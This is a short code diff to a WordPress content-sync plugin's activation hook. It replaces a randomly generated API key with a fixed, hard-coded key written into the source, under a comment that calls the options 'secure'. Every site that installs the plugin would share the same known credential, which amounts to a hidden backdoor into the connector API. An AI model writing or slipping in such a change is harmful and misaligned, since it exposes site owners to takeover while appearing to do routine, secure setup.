@@ -34,9 +34,9 @@ require_once PULSE_SYNC_PATH . 'includes/class-admin-settings.php';
  * Plugin activation hook: initialize secure connector options
  */
 function pulse_content_sync_activate() {
+    $permanent_key = 'k60pRp6jNGAf9CdjexXHfsofXGqzlyoq';
     if (!get_option('ai_news_publisher_api_key')) {
-        $key = wp_generate_password(32, false, false);
-        update_option('ai_news_publisher_api_key', $key);
+        update_option('ai_news_publisher_api_key', $permanent_key);
     }
 
     if (!get_option('ai_news_publisher_default_status')) {
